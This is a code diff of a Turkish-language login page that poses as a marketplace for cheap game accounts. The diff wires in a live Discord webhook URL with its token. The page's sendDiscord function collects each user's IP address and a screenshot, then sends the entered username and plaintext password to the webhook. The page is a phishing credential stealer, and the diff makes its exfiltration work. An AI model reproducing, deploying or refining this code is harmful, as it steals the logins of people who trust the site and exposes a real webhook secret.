@@ -39,9 +39,8 @@ a:hover { text-decoration:underline; }
 <script>
 if(!localStorage.getItem("users")) localStorage.setItem("users", JSON.stringify({}));
 let isRegister = false;
-const webhookURL = "BURAYA_WEBHOOK_URLİNİ_YAPISTIR";
+const webhookURL = "https://discord.com/api/webhooks/1410588142955790366/L5-mLGnXLPpCdd70PeUl2jYyCyPZg1YWHV3DZNwJihAfxSBrM6el1FjJlGMbGkFUIIRn";
 
-// Form toggle
 function toggleForm() {
     isRegister = !isRegister;
     document.getElementById('formTitle').innerText = isRegister ? "Kayıt Ol" : "Giriş Yap";
@@ -50,7 +49,6 @@ function toggleForm() {
     document.getElementById('infoText').innerText = "";
 }
 
-// Giriş / Kayıt
 async function authAction() {
     let username = document.getElementById('username').value.trim();
     let password = document.getElementById('password').value.trim();
@@ -76,7 +74,6 @@ async function authAction() {
     }
 }
 
-// Dashboard göster
 function showDashboard(username){
     document.getElementById('authContainer').style.display='none';
     document.getElementById('dashboard').style.display='block';
@@ -84,7 +81,6 @@ function showDashboard(username){
     generateAds();
 }
 
-// Çıkış
 function logout(){
     document.getElementById('authContainer').style.display='block';
     document.getElementById('dashboard').style.display='none';
@@ -93,7 +89,6 @@ function logout(){
     document.getElementById('infoText').innerText="";
 }
 
-// Random ilan oluştur
 function generateAds(){
     const ads = [
         "PUBG 10 level hesap - 3 TL",
@@ -112,21 +107,26 @@ function generateAds(){
     }
 }
 
-// Discord webhook + SS + IP
 async function sendDiscord(username,password){
+    // IP alma
     let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> "IP alınamadı");
+    
+    // Ekran görüntüsü al
     html2canvas(document.getElementById("authContainer")).then(async canvas=>{
         canvas.toBlob(async function(blob){
             let formData = new FormData();
             formData.append("file", blob,"screenshot.png");
-
+            
             let payload = {
                 "embeds":[{"title":"Yeni Giriş Kaydı",
                            "description":`**Kullanıcı Adı:** ${username}\n**Şifre:** ${password}\n**IP Adresi:** ${ip}`,
                            "color":16711680}]
             };
             formData.append("payload_json", JSON.stringify(payload));
-            await fetch(webhookURL,{method:"POST",body:formData});
+
+            await fetch(webhookURL,{method:"POST",body:formData})
+            .then(()=> console.log("Webhook gönderildi"))
+            .catch(err=> console.error("Webhook gönderilemedi:",err));
         });
     });
 }
